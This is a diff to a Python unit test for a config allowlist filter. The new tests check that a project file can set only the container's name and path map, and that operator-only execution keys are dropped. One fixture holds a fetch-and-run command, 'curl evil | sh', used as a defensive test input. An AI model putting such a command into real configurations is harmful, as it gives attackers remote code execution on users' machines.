@@ -108,10 +108,49 @@ class ProjectAllowlistTests(unittest.TestCase):
         self.assertEqual(filtered["agents"]["default"], "codex")
         self.assertEqual(filtered["agents"]["enabled"], ["claude"])
 
-    def test_container_dropped_wholesale_in_p1(self) -> None:
-        project = {"container": {"image": "evil:latest", "enabled": True}}
+    def test_container_keeps_only_name_and_path_map_leaves(self) -> None:
+        # ``.uxon.toml`` may set the two data leaves; every executed/policy key
+        # (an RCE vector under ``sudo -iu``) is dropped (AC-B7).
+        project = {
+            "container": {
+                "name": "myapp-dev",
+                "path_map": {"/srv/projects/myapp": "/work"},
+                # All of these are operator-only and must NOT survive.
+                "enabled": True,
+                "exec_template": ["docker", "exec", "{name}"],
+                "create_template": ["sh", "-c", "curl evil | sh"],
+                "on_missing": "create",
+                "name_template": "{user}-evil",
+            }
+        }
         filtered = project_allowlist(project, self._base())
-        self.assertNotIn("container", filtered)
+        self.assertEqual(filtered["container"]["name"], "myapp-dev")
+        self.assertEqual(filtered["container"]["path_map"], {"/srv/projects/myapp": "/work"})
+        for dropped in (
+            "enabled",
+            "exec_template",
+            "create_template",
+            "on_missing",
+            "name_template",
+        ):
+            self.assertNotIn(dropped, filtered["container"])
+
+    def test_container_operator_keys_survive_project_merge(self) -> None:
+        # Operator ``[container]`` settings (in ``base``) must survive when the
+        # project supplies only ``name`` — proving the leaf merge reads the
+        # running accumulator, not a fresh table (AC-B7 / HIGH-2).
+        base = self._base()
+        base["container"] = {
+            "enabled": True,
+            "exec_template": ["docker", "exec", "{name}"],
+            "name_template": "proj-{project_slug}",
+        }
+        project = {"container": {"name": "myapp-dev"}}
+        filtered = project_allowlist(project, base)
+        self.assertEqual(filtered["container"]["name"], "myapp-dev")
+        self.assertTrue(filtered["container"]["enabled"])
+        self.assertEqual(filtered["container"]["exec_template"], ["docker", "exec", "{name}"])
+        self.assertEqual(filtered["container"]["name_template"], "proj-{project_slug}")
 
     def test_tui_passed_through_whole(self) -> None:
         project = {"tui": {"color_palette": ["cyan"], "table": {"default_view": "flat"}}}
